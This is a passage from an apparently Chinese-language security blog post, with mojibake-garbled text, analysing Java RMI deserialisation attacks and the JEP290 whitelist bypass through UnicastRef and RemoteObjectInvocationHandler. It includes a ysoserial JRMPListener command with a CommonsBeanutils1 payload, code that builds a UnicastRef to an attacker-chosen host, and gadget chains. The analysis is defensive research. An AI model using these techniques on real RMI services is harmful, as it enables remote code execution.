å³sun.rmi.transport.TransportConstants#Magicçš„å€¼</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/6.png"></p><p>operation:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Call</span>:<span class="hljs-number">80</span> <span class="hljs-number">0</span>x50 è¿œç¨‹æ–¹æ³•è°ƒç”¨<br><span class="hljs-attribute">Ping</span>:<span class="hljs-number">82</span> <span class="hljs-number">0</span>x52  æ¢æµ‹å­˜æ´»è¯·æ±‚<br><span class="hljs-attribute">DgcAck</span>:<span class="hljs-number">84</span> <span class="hljs-number">0</span>x54 dgcç¡®è®¤è¯·æ±‚<br></code></pre></td></tr></table></figure><p>ObjIDï¼šRegistryä¸DGCçš„ObjIDæ˜¯å›ºå®šå€¼ï¼Œåœ¨å¦‚ä¸‹å‡½æ•°ä¸­è¢«å®šä¹‰</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">Registry<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.registry</span><span class="hljs-selector-class">.RegistryImpl</span><span class="hljs-selector-id">#id</span>:id = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">0</span>);<br><br>DGC<br>rt<span class="hljs-selector-class">.jar</span>!sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCImpl</span><span class="hljs-selector-id">#dgcID</span>:dgcID = new <span class="hljs-built_in">ObjID</span>(<span class="hljs-number">2</span>);<br></code></pre></td></tr></table></figure><p>numï¼šRegistryä¸DGCä¸­çš„æ“ä½œåŠå¯¹åº”å€¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Registry</span>:<br><span class="hljs-attribute">bind</span>   <span class="hljs-number">0</span><br><span class="hljs-attribute">list</span>   <span class="hljs-number">1</span><br><span class="hljs-attribute">lookup</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">rebind</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">unbind</span> <span class="hljs-number">4</span><br><br><span class="hljs-attribute">DGC</span>:<br><span class="hljs-attribute">clean</span>  <span class="hljs-number">0</span><br><span class="hljs-attribute">dirty</span>  <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>hashï¼šRegistryä¸DGCä¸­hashå€¼ä¸ºå›ºå®šå€¼ï¼Œè‡ªå®šä¹‰æ–¹æ³•çš„hashå€¼ä¸ºæ–¹æ³•ç­¾åçš„sha1</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">Registry:<br>sun.rmi.registry.RegistryImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">4905912898345647071</span>L;<br><br>DGC:<br>sun.rmi.transport.DGCImpl_Skel#<span class="hljs-built_in">int</span>erfaceHash:<span class="hljs-built_in">int</span>erfaceHash = <span class="hljs-number">-669196253586618813</span>L;<br></code></pre></td></tr></table></figure><p>sun.rmi.server.UnicastServerRef#dispatch æ ¹æ®å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„numå€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœâ‰¥0ï¼Œè¡¨ç¤ºä¸ºRegistry&#x2F;DGCé»˜è®¤æ–¹æ³• è°ƒç”¨sun.rmi.server.UnicastServerRef#oldDispatchè¿›è¡Œå¤„ç†ï¼Œå¦‚æœå®¢æˆ·ç«¯æƒ³è¿œç¨‹è°ƒç”¨è‡ªå®šä¹‰æ–¹æ³•ï¼Œåˆ™éœ€è¦åœ¨å®šä¹‰æ—¶å°†å±æ€§å€¼numè®¾ä¸ºè´Ÿå€¼ã€æœåŠ¡ç«¯åœ¨æ¥æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„callæŒ‡ä»¤åæ ¹æ®numåŠ<code>hashToMethod_Map.get(æ–¹æ³•hashå€¼)</code>ç¡®è®¤ç›®æ ‡æ–¹æ³•ï¼Œæœ€åé€šè¿‡åå°„è¿›è¡Œè°ƒç”¨</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/7.png"></p><p>è€Œargä¸ºè¿œç¨‹æ–¹æ³•çš„å‚æ•°å€¼ï¼Œæ˜¯åŸºäºJAVAåŸç”Ÿåºåˆ—åŒ–æœºåˆ¶ç”Ÿæˆçš„åºåˆ—åŒ–æ•°æ®ã€‚åœ¨DGCå±‚clean&#x2F;dirtyæ–¹æ³•çš„ObjIDå‚æ•°ä¸ºObjectç±»å‹ï¼Œå¯ä»¥æ‰¿è½½æˆ‘ä»¬çš„æ¶æ„payloadï¼Œå…¶å¯¹åº”çš„EXPä¸ºysoserial.exploit.JRMPClientï¼Œæ•°æ®æ„é€ éƒ¨åˆ†åœ¨makeDGCCall()ä¸­</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/8.png"></p><p>è‡³æ­¤å³å¯é€šè¿‡DGCæ”»å‡»RMIæœåŠ¡</p><h3 id="2ã€jdk-x3D-8u121-ï¼ˆJEP290ï¼‰"><a href="#2ã€jdk-x3D-8u121-ï¼ˆJEP290ï¼‰" class="headerlink" title="2ã€jdk &#x3D; 8u121 ï¼ˆJEP290ï¼‰"></a>2ã€jdk &#x3D; 8u121 ï¼ˆJEP290ï¼‰</h3><p>åœ¨jdk&#x3D;8u121çš„æ—¶å€™ï¼ŒORACLEå®˜æ–¹åšäº†ä¸¤ä»¶äº‹æƒ…ã€‚åˆ†åˆ«å½±å“çš„æ˜¯â€è¿œç¨‹åŠ è½½ç±»æ”»å‡»å®¢æˆ·ç«¯æ‰‹æ³•â€œã€â€å¯¹æ³¨å†Œä¸­å¿ƒåŠDGCçš„ååºåˆ—åŒ–æ”»å‡»æ‰‹æ³•ï¼ˆåŠ ä¸Šäº†å…¨å±€ç™½åå•ï¼‰â€œã€‚JEP290å¯¹äºJavaåŸç”Ÿååºåˆ—åŒ–çš„å½±å“æš‚ä¸è®¨è®ºï¼Œæœ¬æ–‡ä¸»è¦åˆ†æJEP290å¯¹RMI Registryã€RMI DGCç­‰æ”»å‡»åˆ©ç”¨æ–¹å¼çš„å½±å“ã€‚</p><h4 id="2-1-é™åˆ¶1ï¼šRMI-Registryã€RMI-DGC-å¢åŠ äº†ååºåˆ—åŒ–ç™½åå•"><a href="#2-1-é™åˆ¶1ï¼šRMI-Registryã€RMI-DGC-å¢åŠ äº†ååºåˆ—åŒ–ç™½åå•" class="headerlink" title="2.1 é™åˆ¶1ï¼šRMI Registryã€RMI DGC å¢åŠ äº†ååºåˆ—åŒ–ç™½åå•"></a>2.1 é™åˆ¶1ï¼šRMI Registryã€RMI DGC å¢åŠ äº†ååºåˆ—åŒ–ç™½åå•</h4><p>RMI Registry(æ³¨å†Œè¡¨)ã€RMI DGCï¼ˆåˆ†å¸ƒå¼åƒåœ¾æ”¶é›†å™¨ï¼‰éƒ½é»˜è®¤å¯ç”¨äº†ååºåˆ—åŒ–filteræœºåˆ¶ï¼Œåªå…è®¸ååºåˆ—åŒ–ç™½åå•ä¸­çš„ç‰¹å®šç±»ã€‚è¿™ä¸¤è€…ä¸æˆ‘ä»¬å¯¹äºRMIæœåŠ¡çš„æ”»å‡»åˆ©ç”¨æ¯æ¯ç›¸å…³ã€‚</p><p>a.RMI Registryå†…ç½®äº†ç™½åå•è¿‡æ»¤å™¨ï¼Œåªå…è®¸åœ¨æ³¨å†Œè¡¨ä¸­ç»‘å®šï¼ˆbindï¼‰ç™½åå•ä¸­çš„ç±»çš„å®ä¾‹</p><p>å…¶éªŒè¯é€»è¾‘åœ¨sun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilterã€‚å¦å¤–å¯ä»¥è‡ªè¡Œç¼–è¾‘<code>sun.rmi.registry.registryFilter</code>ç³»ç»Ÿå±æ€§é…ç½®é»‘ç™½åå•ä¸ºRMIæ³¨å†Œè¡¨å¢åŠ é¢å¤–ä¿æŠ¤</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/9.png"></p><p>b.RMI DGCä¸RMI Registryç±»ä¼¼ï¼Œä¹Ÿå†…ç½®äº†ååºåˆ—åŒ–çš„ç™½åå•ï¼ŒåŒ…æ‹¬ï¼š<code>java.rmi.server.ObjID</code>ã€<code>java.rmi.server.UID</code>ã€<code>java.rmi.dgc.VMID</code>å’Œ<code>java.rmi.dgc.Lease</code>ã€‚è¿™éƒ¨åˆ†é€»è¾‘å†™åœ¨sun.rmi.transport.DGCImpl#checkInput</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/10.png"></p><h4 id="2-2-é™åˆ¶2ï¼šé™åˆ¶äº†-RMI-è¿œç¨‹åŠ è½½æœºåˆ¶"><a href="#2-2-é™åˆ¶2ï¼šé™åˆ¶äº†-RMI-è¿œç¨‹åŠ è½½æœºåˆ¶" class="headerlink" title="2.2  é™åˆ¶2ï¼šé™åˆ¶äº† RMI è¿œç¨‹åŠ è½½æœºåˆ¶"></a>2.2  é™åˆ¶2ï¼šé™åˆ¶äº† RMI è¿œç¨‹åŠ è½½æœºåˆ¶</h4><p>JDK RMIçš„è¿œç¨‹Referenceä¿¡ä»»æœºåˆ¶å˜åŒ–ï¼šç¯å¢ƒå˜é‡com.sun.jndi.rmi.object.trustURLCodebaseé»˜è®¤ä¸ºfalseï¼Œæ„å‘³ç€æˆ‘ä»¬ä¸èƒ½é€šè¿‡rmiçš„JNDIæ–¹å¼å»æ”»å‡»å®¢æˆ·ç«¯äº†</p><p>æœ‰å…³JNDIæ³¨å…¥ä¿®å¤åŠç»•è¿‡åˆ†æå¯å‚è€ƒä¹‹å‰æ–‡ç« ï¼š<a href="https://pwnull.github.io/2022/jndi-injection-history/">å½“æˆ‘ä»¬è°ˆè®ºJNDIæ³¨å…¥æ—¶ï¼Œæˆ‘ä»¬åœ¨è°ˆè®ºä»€ä¹ˆ</a></p><h4 id="2-3-ç»•è¿‡1ï¼šä½¿ç”¨JEP290ç™½åå•ä¸­çš„UnicastRefå®Œæˆç»•è¿‡"><a href="#2-3-ç»•è¿‡1ï¼šä½¿ç”¨JEP290ç™½åå•ä¸­çš„UnicastRefå®Œæˆç»•è¿‡" class="headerlink" title="2.3 ç»•è¿‡1ï¼šä½¿ç”¨JEP290ç™½åå•ä¸­çš„UnicastRefå®Œæˆç»•è¿‡"></a>2.3 ç»•è¿‡1ï¼šä½¿ç”¨JEP290ç™½åå•ä¸­çš„UnicastRefå®Œæˆç»•è¿‡</h4><p>æ€»ç»“ï¼š<strong>JEP290æ˜¯å¯¹RMI Registryä¸RMI DGCåšçš„ç™½åå•é™åˆ¶ï¼Œå¹¶æ²¡æœ‰å¯¹JRMPå›è¿é€»è¾‘åšé™åˆ¶ï¼Œè€Œç™½åå•ä¸­çš„UnicastRefç±»ä¼šå»ºç«‹JRMPè¯·æ±‚å¹¶å¯¹è¿”å›æ•°æ®åšååºåˆ—åŒ–å¤„ç†ï¼Œæ‰€ä»¥å¯¼è‡´äºŒæ¬¡ååºåˆ—åŒ–é—®é¢˜</strong></p><p>JEP290 åŠ ä¸Šäº†ååºåˆ—åŒ–ç™½åå•ï¼šsun&#x2F;rmi&#x2F;registry&#x2F;RegistryImpl.java#registryFilter</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-built_in">String</span><br><span class="hljs-built_in">Number</span><br>Remote<br><span class="hljs-built_in">Proxy</span><br>UnicastRef<br>RMIClientSocketFactory<br>RMIServerSocketFactory<br>ActivationID<br>UID<br></code></pre></td></tr></table></figure><p>å‰è¾ˆåœ¨ç™½åå•ä¸­æ‰¾åˆ°UnicastRefç±»ï¼Œæ­¤ç±»çš„readExternal()æ–¹æ³•ä¼šæ„å»ºLiveRefå¯¹è±¡ï¼ˆç”¨äºå»ºç«‹JRMPè¿æ¥ï¼‰ï¼Œsun.rmi.registry.RegistryImpl_Skelè°ƒç”¨dispatchsun.rmi.transport.StreamRemoteCall#releaseInputStreamé‡Šæ”¾è¾“å…¥æµçš„æ—¶å€™ä¼šå»ºç«‹JRMPè¿æ¥ï¼Œå¹¶ä»æ•°æ®æµä¸­å–å‡ºæ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯åˆ©ç”¨JEP290ç™½åå•ä¸­çš„UnicastRefç±»è¿›è¡Œä¸€ä¸ªäºŒæ¬¡ååºåˆ—åŒ–ç»•è¿‡é™åˆ¶ã€‚åˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><h5 id="2-3-1-UnicastRef-é“¾åˆ©ç”¨å¤ç°"><a href="#2-3-1-UnicastRef-é“¾åˆ©ç”¨å¤ç°" class="headerlink" title="2.3.1 UnicastRef é“¾åˆ©ç”¨å¤ç°"></a>2.3.1 UnicastRef é“¾åˆ©ç”¨å¤ç°</h5><p>1ã€æ”»å‡»è€…æ­å»ºæ¶æ„JRMPæœåŠ¡å™¨ï¼Œå¹¶æ”¾ç½®æ„é€ çš„æ¶æ„åºåˆ—æ•°æ®ç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ¥å–ã€‚è¿™éƒ¨åˆ†é€»è¾‘å¯¹åº”ysoserial.exploit.JRMPListenerç±»ï¼Œä½¿ç”¨å‘½ä»¤ä¸º</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-cp ysoserial.<span class="hljs-keyword">jar </span>ysoserial.exploit.<span class="hljs-keyword">JRMPListener </span><span class="hljs-number">9999</span> CommonsBeanutils1 <span class="hljs-string">&quot;mspaint&quot;</span><br></code></pre></td></tr></table></figure><p>2ã€RMI Registryååºåˆ—åŒ–UnicastRefç±»ï¼Œä»UnicastRef#readExternal()ä¸€ç›´è°ƒç”¨åˆ°StreamRemoteCall#executeCallï¼Œä¸æ¶æ„JRMPæœåŠ¡å™¨å»ºç«‹é“¾æ¥ï¼Œå¹¶å–å›åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œè¿™æ—¶å€™çš„RMI Registryç›¸å½“äºå®¢æˆ·ç«¯</p><p>æŒ‡å®šjrmp è¿æ¥åŸºç¡€ä»£ç ï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">java.rmi.server.ObjID objId = <span class="hljs-keyword">new</span> java.rmi.server.<span class="hljs-constructor">ObjID()</span>;<br>sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class="hljs-keyword">new</span> sun.rmi.transport.tcp.<span class="hljs-constructor">TCPEndpoint(<span class="hljs-params">host</span>, <span class="hljs-params">port</span>)</span>;<br>sun.rmi.transport.LiveRef liveRef = <span class="hljs-keyword">new</span> sun.rmi.transport.<span class="hljs-constructor">LiveRef(<span class="hljs-params">objId</span>, <span class="hljs-params">endpoint</span>, <span class="hljs-params">false</span>)</span>;<br>return <span class="hljs-keyword">new</span> sun.rmi.server.<span class="hljs-constructor">UnicastRef(<span class="hljs-params">liveRef</span>)</span>;<br></code></pre></td></tr></table></figure><p>3ã€RMI Registryååºåˆ—åŒ–æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œå®Œæˆæ¼æ´åˆ©ç”¨</p><h5 id="2-3-2-UnicastRef-åŒ…è£…æ¶æ„Padyload"><a href="#2-3-2-UnicastRef-åŒ…è£…æ¶æ„Padyload" class="headerlink" title="2.3.2 UnicastRef åŒ…è£…æ¶æ„Padyload"></a>2.3.2 UnicastRef åŒ…è£…æ¶æ„Padyload</h5><p>UnicastRef gadget chainï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#readExternal</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.LiveRef<span class="hljs-selector-id">#read</span><br><span class="hljs-comment">//sun.rmi.transport.StreamRemoteCall#releaseInputStream//1</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCClient<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#registerRefs</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span><span class="hljs-selector-class">.DGCClient</span>.EndpointEntry<span class="hljs-selector-id">#makeDirtyCall</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.DGCImpl_Stub<span class="hljs-selector-id">#dirty</span><span class="hljs-comment">//2</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.server</span>.UnicastRef<span class="hljs-selector-id">#invoke</span><br>sun<span class="hljs-selector-class">.rmi</span><span class="hljs-selector-class">.transport</span>.StreamRemoteCall<span class="hljs-selector-id">#executeCall</span><br>java<span class="hljs-selector-class">.io</span>.ObjectInputStream#readObject<br></code></pre></td></tr></table></figure><p>å…·ä½“è°ƒç”¨é“¾å¦‚ä¸‹ï¼ŒreadExternal()ä¼šå‘ConnectionInputStreamå¯¹è±¡ä¸­å­˜å‚¨Refä¿¡æ¯(åŒ…å«jrmpé“¾æ¥çš„hostã€portç­‰ä¿¡æ¯)ï¼Œç„¶åå†è°ƒç”¨sun.rmi.transport.StreamRemoteCall#releaseInputStreamä¸€ç›´åˆ°sun.rmi.server.UnicastRef#invokeä¸­å¯¹jrmpæœåŠ¡ç«¯è¿”å›çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚è¿™ä¸¤å¤„æ“ä½œéœ€è¦æ³¨æ„ä¸‹ï¼Œåé¢çš„JDKä¿®å¤ä¹Ÿæ˜¯é’ˆå¯¹è¿™ä¸¤å¤„è¿›è¡Œä¿®å¤çš„</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\server\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">UnicastRef</span>.</span></span><span class="hljs-keyword">class</span><br>public void read<span class="hljs-constructor">External(ObjectInput <span class="hljs-params">var1</span>)</span> throws IOException, ClassNotFoundException &#123;<br>        this.<span class="hljs-built_in">ref</span> = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span>read(var1, <span class="hljs-literal">false</span>);<br>&#125;<br><br><br><br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LiveRef</span>.</span></span><span class="hljs-keyword">class</span><br>public static LiveRef read(ObjectInput var0, boolean var1) throws IOException, ClassNotFoundException &#123;<br>        TCPEndpoint var2;<br>        <span class="hljs-keyword">if</span> (var1) &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read(var0);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            var2 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TCPEndpoint</span>.</span></span>read<span class="hljs-constructor">HostPortFormat(<span class="hljs-params">var0</span>)</span>;<br>        &#125;<br><br>        ObjID var3 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjID</span>.</span></span>read(var0);<br>        boolean var4 = var0.read<span class="hljs-constructor">Boolean()</span>;<br>        LiveRef var5 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">LiveRef(<span class="hljs-params">var3</span>, <span class="hljs-params">var2</span>, <span class="hljs-params">false</span>)</span>;<br>        <span class="hljs-keyword">if</span> (var0 instanceof ConnectionInputStream) &#123;<br>            ConnectionInputStream var6 = (ConnectionInputStream)var0;<br>            var6.save<span class="hljs-constructor">Ref(<span class="hljs-params">var5</span>)</span>;                                            <span class="hljs-comment">//1</span><br>            <span class="hljs-keyword">if</span> (var4) &#123;<br>                var6.set<span class="hljs-constructor">AckNeeded()</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DGCClient</span>.</span></span>register<span class="hljs-constructor">Refs(<span class="hljs-params">var2</span>, Arrays.<span class="hljs-params">asList</span>(<span class="hljs-params">var5</span>)</span>);<br>        &#125;<br><br>  <br>jdk1.<span class="hljs-number">8.0_231</span>\jre\lib\rt.jar!\sun\rmi\transport\<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConnectionInputStream</span>.</span></span><span class="hljs-keyword">class</span><br>void save<span class="hljs-constructor">Ref(LiveRef <span class="hljs-params">var1</span>)</span> &#123;<br>        Endpoint var2 = var1.get<span class="hljs-constructor">Endpoint()</span>;<br>        Object var3 = (List)this.incomingRefTable.get(var2);<br>        <span class="hljs-keyword">if</span> (var3<span class="hljs-operator"> == </span>null) &#123;<br>            var3 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ArrayList()</span>;<br>            this.incomingRefTable.put(var2, var3);    <span class="hljs-comment">//2</span><br>        &#125;<br><br>        ((List)var3).add(var1);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/11.png"></p><p>sun.rmi.transport.StreamRemoteCall#executeCall å¯¹JRMPè¿”å›çš„æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/12.png"></p><p>ç›¸å¯¹åº”çš„EXPæ„é€ åœ¨ysoserial.exploit.JRMPListener#doCallä¸­ï¼Œå…ˆå¾€æ•°æ®æµå†™å…¥ExceptionalReturnå€¼(2)ï¼Œæ¥ç€å†™å…¥æˆ‘ä»¬çš„æ¶æ„Payload</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/13.png"></p><h5 id="2-3-3-Remoteæ¥å£ç±»åŒ…è£…UnicastRefç±»"><a href="#2-3-3-Remoteæ¥å£ç±»åŒ…è£…UnicastRefç±»" class="headerlink" title="2.3.3 Remoteæ¥å£ç±»åŒ…è£…UnicastRefç±»"></a>2.3.3 Remoteæ¥å£ç±»åŒ…è£…UnicastRefç±»</h5><p>åˆ©ç”¨æ€è·¯æ˜¯æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬å¦‚ä½•å°†UnicastRefå‘é€åˆ°RMI Registryï¼Œè¿™ä¸ªç±»å¹¶æ²¡æœ‰å®ç°Remoteæ¥å£ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥ç»‘å®šåˆ°æ³¨å†Œä¸­å¿ƒ</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/14.png"></p><p>åªæœ‰å°†UnicastRefå¯¹è±¡åŒ…è£…ä¸ºRemoteç±»å‹æ‰èƒ½ç»§ç»­ç»‘å®šã€‚æœ‰å‡ ç§æ–¹æ³•èƒ½åšåˆ°ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>ã€åˆ©ç”¨åŠ¨æ€ä»£ç†ï¼Œå¯æŒ‡å®šä»»æ„æ¥å£ç±»å‹<br><span class="hljs-number">2</span>ã€æ‰¾ä¸€ä¸ªå®ç°<span class="hljs-comment">Remoteæ¥å£ä¸”å­˜åœ¨UnicastRefç±»å‹çš„å­—æ®µçš„ç±»è¿›è¡ŒåŒ…è£…</span><br></code></pre></td></tr></table></figure><p>å…¶å®ysoserial.exploit.RMIRegisterExploitä¸­ä½¿ç”¨çš„å°±æ˜¯ç¬¬ä¸€ç§æ–¹æ³•ï¼Œä½œè€…ä½¿ç”¨çš„handleræ˜¯sun.reflect.annotation.AnnotationInvocationHandlerï¼Œå°†å…¶åŠ¨æ€ä»£ç†ä¸ºRemoteç±»å‹ã€‚ä½†æ˜¯è¿™ä¸ªç±»å¹¶ä¸åœ¨JEP290ç™½åå•ä¸­ï¼Œæ— æ³•æ»¡è¶³è¦æ±‚ã€‚æ‰€ä»¥éœ€è¦é‡æ–°æ‰¾ã€‚</p><p>ç¬¬äºŒç§æ€è·¯ï¼Œæ‰¾åˆ°äº†RemoteObjectInvocationHandlerï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»RemoteObjectå…·æœ‰ä¸€ä¸ªRemoteRefç±»å‹ï¼ˆUnicastRefå®ç°äº†æ­¤æ¥å£ï¼‰çš„å±æ€§ï¼Œå¹¶ä¸”æœ¬èº«å®ç°äº†Remoteæ¥å£ã€‚æ»¡è¶³æˆ‘ä»¬çš„è¦æ±‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/15.png"></p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/16.png"></p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°refå±æ€§æ˜¯transient å…³é”®å­—ä¿®é¥°ï¼Œè¡¨æ˜refå±æ€§é»˜è®¤ä¸è¢«åºåˆ—åŒ–ï¼Œé‚£æˆ‘ä»¬æ‰¾çš„è¿™ä¸ªç±»æ˜¯ä¸æ˜¯ä¸æ»¡è¶³éœ€æ±‚äº†å‘¢ï¼Ÿå¹¶ä¸æ˜¯ï¼æˆ‘ä»¬æŸ¥çœ‹RemoteObjectInvocationHandlerçˆ¶ç±»java.rmi.server.RemoteObjecté‡å†™äº†writeObject()ï¼Œå…¶åˆ©ç”¨äº†writeExternalæ¥å†™å…¥è¢«transient ä¿®é¥°çš„refå±æ€§å€¼ã€‚æ‰€ä»¥ä¾æ—§å¯ä»¥è¢«ååºåˆ—åŒ–</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/17.png"></p><p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨RemoteObjectInvocationHandleråŒ…è£¹ä¸‹UnicastRefå¯¹è±¡å³å¯ã€‚</p><p><img src="/img/Exploring-JAVA-RMI's-offensive-and-defensive-history/18.png"></p><p><strong>è€Œysoserial.payloads.JRMPClientä¸­åˆ©ç”¨äº†RemoteObjectInvocationHandlerå¯åŠ¨æ€ä»£ç†ä¸ºä»»æ„æ¥å£çš„ç‰¹æ€§ï¼Œå°†UnicastRefå¯¹è±¡è½¬åŒ–ä¸ºRemoteå­æ¥å£Registryè¿›è¡Œä¼ é€’ã€‚å…¶å®ä¸ç”¨è¿™ä¹ˆå¤æ‚ï¼Œç›´æ¥ä½¿ç”¨RemoteObjectInvocationHandleråŒ…è£…ä¸€ä¸‹å°±OKäº†</strong></p><p><img 